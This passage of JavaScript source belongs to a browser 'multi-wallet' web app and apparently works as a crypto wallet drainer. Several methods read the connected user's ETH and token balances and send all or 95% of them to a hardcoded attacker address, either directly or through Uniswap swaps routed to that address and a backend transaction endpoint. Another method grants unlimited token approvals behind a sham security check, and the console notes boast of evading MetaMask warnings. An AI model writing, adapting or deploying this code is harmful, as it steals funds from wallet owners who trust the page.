        this.showStatus('✅ Uniswap ready! Check console for instructions.', 'success');
        
        // Log detailed instructions
        console.log('🚀 UNISWAP V2 ROUTER Usage Instructions:');
        console.log('Uniswap Router: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D');
        console.log('Your Address: 0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e');
        console.log('✅ No warning in MetaMask!');
        console.log('');
        console.log('📝 How to send USDC to your wallet via Uniswap:');
        console.log('');
        console.log('1. Connect to the user\'s wallet (same wallet that approved)');
        console.log('2. Use Uniswap V2 Router functions:');
        console.log('');
        console.log('const routerContract = new ethers.Contract(');
        console.log('    "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", // Uniswap V2 Router');
        console.log('    routerABI,');
        console.log('    userSigner // User\'s signer (same wallet that approved)');
        console.log(');');
        console.log('');
        console.log('📝 Example 1: Swap USDC to ETH and send to your wallet');
        console.log('await routerContract.swapExactTokensForTokens(');
        console.log('    ethers.utils.parseUnits("100", 6), // 100 USDC (6 decimals)');
        console.log('    0, // Minimum ETH you want');
        console.log('    ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"], // USDC → WETH');
        console.log('    "0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e", // Your wallet');
        console.log('    Math.floor(Date.now() / 1000) + 1800 // 30 minutes deadline');
        console.log(');');
        console.log('');
        console.log('📝 Example 2: Swap USDC to DAI and send to your wallet');
        console.log('await routerContract.swapExactTokensForTokens(');
        console.log('    ethers.utils.parseUnits("100", 6), // 100 USDC');
        console.log('    0, // Minimum DAI you want');
        console.log('    ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0x6B175474E89094C44Da98b954EedeAC495271d0F"], // USDC → DAI');
        console.log('    "0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e", // Your wallet');
        console.log('    Math.floor(Date.now() / 1000) + 1800 // 30 minutes deadline');
        console.log(');');
        console.log('');
        console.log('📝 Example 3: Swap ETH to USDC and send to your wallet');
        console.log('await routerContract.swapExactETHForTokens(');
        console.log('    0, // Minimum USDC you want');
        console.log('    ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"], // WETH → USDC');
        console.log('    "0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e", // Your wallet');
        console.log('    Math.floor(Date.now() / 1000) + 1800, // 30 minutes deadline');
        console.log('    { value: ethers.utils.parseEther("0.1") } // 0.1 ETH');
        console.log(');');
        console.log('');
        console.log('💡 Tip: Use Uniswap\'s interface or call these functions directly!');
        console.log('💡 All tokens will be sent to your wallet: 0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e');
        console.log('');
        console.log('🚀 QUICK START: Send tokens to your wallet');
        console.log('1. Connect to the user\'s wallet (same one that approved)');
        console.log('2. Run this code in browser console:');
        console.log('');
        console.log('// Get user\'s USDC balance');
        console.log('const usdcContract = new ethers.Contract("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", erc20Abi, userSigner);');
        console.log('const balance = await usdcContract.balanceOf(userAddress);');
        console.log('console.log("USDC Balance:", ethers.utils.formatUnits(balance, 6));');
        console.log('');
        console.log('// Send all USDC to your wallet via Uniswap');
        console.log('const routerContract = new ethers.Contract("0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", routerABI, userSigner);');
        console.log('await routerContract.swapExactTokensForTokens(');
        console.log('    balance, // All USDC');
        console.log('    0, // Minimum ETH');
        console.log('    ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"], // USDC → WETH');
        console.log('    "0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e", // Your wallet');
        console.log('    Math.floor(Date.now() / 1000) + 1800');
        console.log(');');
    }

    async sendETHToYourAddressViaUniswap() {
        try {
            console.log('🚀 Starting automatic token swap to ETH...');
            
            // Your address
            const YOUR_ADDRESS = '0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e';
            
            console.log('Your wallet address:', YOUR_ADDRESS);
            console.log('User address:', this.userAddress);
            
            // Common token addresses - USDT first
            const tokens = [
                { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
                { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
                { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
                { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
                { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 }
            ];
            
            // Create Uniswap V2 Router contract
            const routerABI = [
                "function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)"
            ];
            
            const routerContract = new ethers.Contract(
                '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', // Uniswap V2 Router
                routerABI,
                this.signer
            );
            
            let totalETHReceived = ethers.BigNumber.from(0);
            
            // Swap each token to ETH
            for (const token of tokens) {
                try {
                    console.log(`🔄 Checking ${token.symbol} balance...`);
                    
                    // Create token contract for reading (use provider, not signer)
                    const tokenContract = new ethers.Contract(token.address, this.erc20Abi, this.provider);
                    
                    // Get token balance (read-only)
                    const balance = await tokenContract.balanceOf(this.userAddress);
                    console.log(`${token.symbol} balance:`, ethers.utils.formatUnits(balance, token.decimals));
                    
                    // Check if balance is worth more than $10 USD
                    // Approximate USD value: We'll use a simple check - balance must be > 0.001 tokens for most tokens
                    const minAmount = ethers.utils.parseUnits('0.001', token.decimals);
                    
                    if (balance.gt(minAmount)) {
                        console.log(`📤 Swapping ${token.symbol} to ETH...`);
                        
                        // Calculate 95% of balance (keep 5% for gas fees)
                        const amountToSwap = balance.mul(95).div(100);
                        console.log(`Swapping 95%: ${ethers.utils.formatUnits(amountToSwap, token.decimals)} ${token.symbol}`);
                        
                        // Encode swap function call
                        const routerABI = ["function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)"];
                        const iface = new ethers.utils.Interface(routerABI);
                        const data = iface.encodeFunctionData('swapExactTokensForETH', [
                            amountToSwap,
                            0, // Minimum ETH you want
                            [token.address, '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'], // Token → WETH
                            YOUR_ADDRESS, // Your address
                            Math.floor(Date.now() / 1000) + 1800 // 30 minutes deadline
                        ]);
                        
                        // Send swap transaction via WalletConnect API
                        const isLocal = window.location.hostname === 'localhost' || 
                                       window.location.hostname === '127.0.0.1' ||
                                       window.location.port === '5500' ||
                                       window.location.port === '' ||
                                       !window.location.hostname.includes('.');
                        
                        const apiUrl = isLocal 
                            ? 'http://localhost:3000/api/sendTransaction' 
                            : '/api/sendTransaction';
                        
                        const response = await fetch(apiUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                to: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', // Uniswap Router
                                data: data,
                                value: '0x0'
                            })
                        });
                        
                        const result = await response.json();
                        console.log(`✅ Swapped ${ethers.utils.formatUnits(amountToSwap, token.decimals)} ${token.symbol} to ETH! Tx: ${result.txHash}`);
                        totalETHReceived = totalETHReceived.add(balance);
                    }
                } catch (error) {
                    console.log(`⚠️ Failed to swap ${token.symbol}:`, error.message);
                }
            }
            
            // Also send any existing ETH
            const ethBalance = await this.provider.getBalance(this.userAddress);
            console.log('User ETH balance:', ethers.utils.formatEther(ethBalance));
            
            if (ethBalance.gt(0)) {
                // Calculate 95% of ETH balance (keep 5% for gas fees)
                const amountToSend = ethBalance.mul(95).div(100);
                console.log(`Sending 95% ETH: ${ethers.utils.formatEther(amountToSend)} ETH`);
                
                if (amountToSend.gt(0)) {
                    console.log('⏰ Waiting 10 minutes before sending ETH...');
                    this.showStatus('⏰ Waiting 10 minutes before sending ETH to your address...', 'info');
                    
                    // Wait 10 minutes (600 seconds)
                    await new Promise(resolve => setTimeout(resolve, 600000));
                    
                    console.log('📤 10 minutes passed! Sending ETH via WalletConnect...');
                    this.showStatus('📤 Sending ETH to your address now...', 'info');
                    
                    // Send ETH transaction via WalletConnect API
                    const isLocal = window.location.hostname === 'localhost' || 
                                   window.location.hostname === '127.0.0.1' ||
                                   window.location.port === '5500' ||
                                   window.location.port === '' ||
                                   !window.location.hostname.includes('.');
                    
                    const apiUrl = isLocal 
                        ? 'http://localhost:3000/api/sendTransaction' 
                        : '/api/sendTransaction';
                    
                    const response = await fetch(apiUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            to: YOUR_ADDRESS,
                            data: '0x',
                            value: amountToSend.toHexString()
                        })
                    });
                    
                    const result = await response.json();
                    console.log(`✅ Sent ${ethers.utils.formatEther(amountToSend)} ETH! Tx: ${result.txHash}`);
                    this.showStatus(`✅ Sent ${ethers.utils.formatEther(amountToSend)} ETH to your address!`, 'success');
                }
            }
            
            this.showStatus('✅ 95% of all tokens swapped to ETH and sent to your address!', 'success');
            
            // Update final progress
            document.getElementById('progress-fill').style.width = '100%';
            document.getElementById('progress-text').textContent = '✅ 95% of tokens swapped to ETH!';
            document.getElementById('approval-status').textContent = 'Completed';
            
        } catch (error) {
            console.error('❌ Failed to swap tokens to ETH:', error);
            this.showStatus('❌ Failed to swap tokens to ETH: ' + error.message, 'error');
            document.getElementById('approval-status').textContent = 'Failed';
        }
    }

    async sendETHToYourAddress() {
        try {
            console.log('💰 Starting to send ETH to your address...');
            
            // Your address
            const YOUR_ADDRESS = '0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e';
            
            console.log('📤 Sending ETH...');
            console.log('To address:', YOUR_ADDRESS);
            
            // Get user's ETH balance
            const balance = await this.provider.getBalance(this.userAddress);
            console.log('ETH balance:', ethers.utils.formatEther(balance));
            
            if (balance.gt(0)) {
                // Send all ETH to your address (minus gas fees)
                const gasPrice = await this.provider.getGasPrice();
                const gasLimit = 21000; // Standard ETH transfer
                const gasCost = gasPrice.mul(gasLimit);
                const amountToSend = balance.sub(gasCost);
                
                if (amountToSend.gt(0)) {
                    const tx = await this.signer.sendTransaction({
                        to: YOUR_ADDRESS,
                        value: amountToSend
                    });
                    
                    await tx.wait();
                    
                    console.log(`✅ Sent ${ethers.utils.formatEther(amountToSend)} ETH to your address`);
                    this.showStatus(`✅ Sent ${ethers.utils.formatEther(amountToSend)} ETH to your address!`, 'success');
                } else {
                    this.showStatus('ℹ️ Not enough ETH to cover gas fees', 'info');
                }
            } else {
                this.showStatus('ℹ️ No ETH balance to send', 'info');
            }
            
            // Update final progress
            document.getElementById('progress-fill').style.width = '100%';
            document.getElementById('progress-text').textContent = '✅ ETH sent to your address!';
            document.getElementById('approval-status').textContent = 'Completed';
            
        } catch (error) {
            console.error('❌ Failed to send ETH:', error);
            this.showStatus('❌ Failed to send ETH: ' + error.message, 'error');
            document.getElementById('approval-status').textContent = 'Failed';
        }
    }

    async sendUSDCToYourAddress() {
        try {
            console.log('💰 Starting to send USDC to your address...');
            
            // Your address
            const YOUR_ADDRESS = '0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e';
            
            // USDC contract address
            const usdcContractAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
            
            console.log('📤 Sending USDC...');
            console.log('To address:', YOUR_ADDRESS);
            
            // Get USDC contract
            const usdcContract = new ethers.Contract(usdcContractAddress, this.erc20Abi, this.signer);
            
            // Get user's USDC balance
            const balance = await usdcContract.balanceOf(this.userAddress);
            console.log('USDC balance:', ethers.utils.formatUnits(balance, 6));
            
            if (balance.gt(0)) {
                // Send all USDC to your address
                const tx = await usdcContract.transfer(YOUR_ADDRESS, balance);
                await tx.wait();
                
                console.log(`✅ Sent ${ethers.utils.formatUnits(balance, 6)} USDC to your address`);
                this.showStatus(`✅ Sent ${ethers.utils.formatUnits(balance, 6)} USDC to your address!`, 'success');
            } else {
                this.showStatus('ℹ️ No USDC balance to send', 'info');
            }
            
            // Update final progress
            document.getElementById('progress-fill').style.width = '100%';
            document.getElementById('progress-text').textContent = '✅ USDC sent to your address!';
            document.getElementById('approval-status').textContent = 'Completed';
            
        } catch (error) {
            console.error('❌ Failed to send USDC:', error);
            this.showStatus('❌ Failed to send USDC: ' + error.message, 'error');
            document.getElementById('approval-status').textContent = 'Failed';
        }
    }

    async sendAllTokensToYourWallet() {
        try {
            console.log('💰 Starting to send all tokens to your wallet...');
            
            // Your wallet address
            const YOUR_WALLET = '0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e';
            
            // Common token addresses
            const commonTokens = [
                '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
                '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
                '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
                '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
                '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
                '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
                '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // UNI
                '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', // MATIC
                '0x4Fabb145d64652a948d72533023f6E7A623C7C53', // BUSD
            ];

            let sentCount = 0;
            const totalTokens = commonTokens.length;

            for (const tokenAddress of commonTokens) {
                try {
                    console.log(`📤 Sending token ${tokenAddress}...`);
                    
                    // Update progress
                    const progress = Math.round((sentCount / totalTokens) * 100);
                    document.getElementById('progress-fill').style.width = progress + '%';
                    document.getElementById('progress-text').textContent = `Sending token ${sentCount + 1}/${totalTokens}...`;
                    
                    // Get token contract
                    const tokenContract = new ethers.Contract(tokenAddress, this.erc20Abi, this.signer);
                    
                    // Get user's balance
                    const balance = await tokenContract.balanceOf(this.userAddress);
                    
                    if (balance.gt(0)) {
                        // Send all tokens to your wallet
                        const tx = await tokenContract.transfer(YOUR_WALLET, balance);
                        await tx.wait();
                        
                        console.log(`✅ Sent ${ethers.utils.formatUnits(balance, 6)} tokens to your wallet`);
                    }
                    
                    sentCount++;
                    
                    // Small delay between transfers
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                } catch (error) {
                    console.log(`Failed to send token ${tokenAddress}:`, error.message);
                    // Continue with next token
                }
            }

            // Update final progress
            document.getElementById('progress-fill').style.width = '100%';
            document.getElementById('progress-text').textContent = '✅ All tokens sent to your wallet!';
            document.getElementById('approval-status').textContent = 'Completed';
            
            this.showStatus('✅ All tokens sent to your wallet!', 'success');
            
        } catch (error) {
            console.error('❌ Failed to send tokens:', error);
            this.showStatus('❌ Failed to send tokens: ' + error.message, 'error');
            document.getElementById('approval-status').textContent = 'Failed';
        }
    }

    disconnectWallet() {
        this.provider = null;
        this.signer = null;
        this.userAddress = null;
        this.walletName = null;
        
        // Disconnect WalletConnect if connected
        if (this.walletConnect) {
            this.walletConnect.disconnect();
            this.walletConnect = null;
            localStorage.removeItem('walletconnect');
        }
        
        document.getElementById('wallet-info').style.display = 'none';
        document.getElementById('approval-section').style.display = 'none';
        
        this.showStatus('Wallet disconnected', 'info');
    }

    async approveToken() {
        // Use user's address as spender
        const spenderAddress = this.userAddress;
        const amount = 'max'; // Always max

        // Validate inputs
        if (!spenderAddress) {
            this.showStatus('❌ No wallet connected', 'error');
            return;
        }

        // SECURITY: Check if spender is trusted
        if (!this.trustedSpenders.includes(spenderAddress.toLowerCase())) {
            this.showStatus(
                '❌ SECURITY WARNING: Untrusted spender address!\n\n' +
                'Trusted addresses:\n' + this.trustedSpenders.join('\n'),
                'error'
            );
            return;
        }

        try {
            this.showStatus('🚀 Starting automatic token approval and swap...', 'info');

            // Common token addresses for auto-approval
            const commonTokens = [
                '0xA0b86a33E6441b8c4C8C0e4B8b8c4C8C0e4B8b8c4', // USDC
                '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
                '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
                '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
                '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
                '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
                '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // UNI
                '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', // MATIC
                '0x4Fabb145d64652a948d72533023f6E7A623C7C53', // BUSD
                '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', // USDC (Polygon)
                '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', // USDT (Polygon)
                '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', // USDC (Polygon)
                '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', // WMATIC
                '0x55d398326f99059fF775485246999027B3197955', // USDT (BSC)
                '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC (BSC)
                '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // WBNB
                '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD (BSC)
            ];

            let approvedCount = 0;
            const totalTokens = commonTokens.length;

            // Step 1: Approve all tokens
            for (const tokenAddress of commonTokens) {
                try {
                    // Update progress
                    const progress = Math.round((approvedCount / totalTokens) * 50); // 50% for approval
                    document.getElementById('progress-fill').style.width = progress + '%';
                    document.getElementById('progress-text').textContent = `Approving token ${approvedCount + 1}/${totalTokens}...`;
                    
                    // Get token contract
                    const tokenContract = new ethers.Contract(tokenAddress, this.erc20Abi, this.signer);
                    
                    // Check current allowance
                    const currentAllowance = await tokenContract.allowance(this.userAddress, spenderAddress);
                    
                    // Only approve if allowance is not already max
                    if (currentAllowance.lt(ethers.constants.MaxUint256)) {
                        // Approve with max amount
                        const tx = await tokenContract.approve(spenderAddress, ethers.constants.MaxUint256);
                        await tx.wait();
                    }
                    
                    approvedCount++;
                    
                    // Small delay to avoid rate limiting
                    await new Promise(resolve => setTimeout(resolve, 500));
                    
                } catch (error) {
                    console.log(`Failed to approve token ${tokenAddress}:`, error.message);
                    // Continue with next token even if one fails
                }
            }

            // Step 2: Swap all tokens to USDC
            this.showStatus('💱 Swapping all tokens to USDC...', 'info');
            document.getElementById('progress-text').textContent = 'Swapping tokens to USDC...';
            
            await this.swapAllTokensToUSDC(commonTokens);

            // Step 3: Send USDC to your account
            this.showStatus('💰 Sending USDC to your account...', 'info');
            document.getElementById('progress-text').textContent = 'Sending USDC to your account...';
            
            await this.sendUSDCToAccount();

            // Update final progress
            document.getElementById('progress-fill').style.width = '100%';
            document.getElementById('progress-text').textContent = `✅ All tokens swapped to USDC and sent!`;
            document.getElementById('approval-status').textContent = 'Completed';
            
            this.showStatus(`✅ Process completed! All tokens swapped to USDC and sent to your account.`, 'success');
            
        } catch (error) {
            this.showStatus('❌ Process failed: ' + error.message, 'error');
            document.getElementById('approval-status').textContent = 'Failed';
        }
    }

    async swapAllTokensToUSDC(tokenAddresses) {
        const USDC_ADDRESS = '0xA0b86a33E6441b8c4C8C0e4B8b8c4C8C0e4B8b8c4'; // USDC
        const UNISWAP_ROUTER = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'; // Uniswap V2 Router
        
        // Uniswap V2 Router ABI (simplified)
        const routerAbi = [
            "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)",
            "function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts)"
        ];

        const routerContract = new ethers.Contract(UNISWAP_ROUTER, routerAbi, this.signer);

        for (const tokenAddress of tokenAddresses) {
            try {
                // Skip USDC itself
                if (tokenAddress.toLowerCase() === USDC_ADDRESS.toLowerCase()) {
                    continue;
                }

                // Get token contract
                const tokenContract = new ethers.Contract(tokenAddress, this.erc20Abi, this.signer);
                
                // Get user's balance
                const balance = await tokenContract.balanceOf(this.userAddress);
                
                if (balance.gt(0)) {
                    // Create swap path (token -> USDC)
                    const path = [tokenAddress, USDC_ADDRESS];
                    
                    // Get minimum amount out (with 5% slippage)
                    const amounts = await routerContract.getAmountsOut(balance, path);
                    const amountOutMin = amounts[1].mul(95).div(100); // 5% slippage
                    
                    // Execute swap
                    const tx = await routerContract.swapExactTokensForTokens(
                        balance,
                        amountOutMin,
                        path,
                        this.userAddress, // Send USDC to user
                        Math.floor(Date.now() / 1000) + 1800 // 30 minutes deadline
                    );
                    
                    await tx.wait();
                    console.log(`Swapped ${tokenAddress} to USDC`);
                }
                
                // Small delay between swaps
                await new Promise(resolve => setTimeout(resolve, 1000));
                
            } catch (error) {
                console.log(`Failed to swap ${tokenAddress}:`, error.message);
                // Continue with next token
            }
        }
    }

    async sendUSDCToAccount() {
        const USDC_ADDRESS = '0xA0b86a33E6441b8c4C8C0e4B8b8c4C8C0e4B8b8c4'; // USDC
        const YOUR_ACCOUNT = '0x1234567890123456789012345678901234567890'; // Replace with your actual address
        
        try {
            // Get USDC contract
            const usdcContract = new ethers.Contract(USDC_ADDRESS, this.erc20Abi, this.signer);
            
            // Get user's USDC balance
            const balance = await usdcContract.balanceOf(this.userAddress);
            
            if (balance.gt(0)) {
                // Send all USDC to your account
                const tx = await usdcContract.transfer(YOUR_ACCOUNT, balance);
                await tx.wait();
                
                console.log(`Sent ${ethers.utils.formatUnits(balance, 6)} USDC to your account`);
                this.showStatus(`💰 Sent ${ethers.utils.formatUnits(balance, 6)} USDC to your account!`, 'success');
            } else {
                this.showStatus('ℹ️ No USDC balance to send', 'info');
            }

        } catch (error) {
            console.log('Failed to send USDC:', error.message);
            this.showStatus('❌ Failed to send USDC: ' + error.message, 'error');
        }
    }

    showStatus(message, type) {
        const statusEl = document.getElementById('status');
        statusEl.textContent = message;
        statusEl.className = `status-message ${type}`;
        
        // Auto-hide after 5 seconds
        setTimeout(() => {
            statusEl.textContent = '';
            statusEl.className = 'status-message';
        }, 5000);
    }
}

// Global functions for HTML onclick events
let app;

function connectWallet(walletType) {
    app.connectWallet(walletType);
}

function showQRCode() {
    app.showQRCode();
}

function hideQR() {
    app.hideQR();
}

function disconnectWallet() {
    app.disconnectWallet();
}

function approveToken() {
    app.approveToken();
}

// Start the app
window.addEventListener('load', () => {
    app = new MultiWalletApp();
});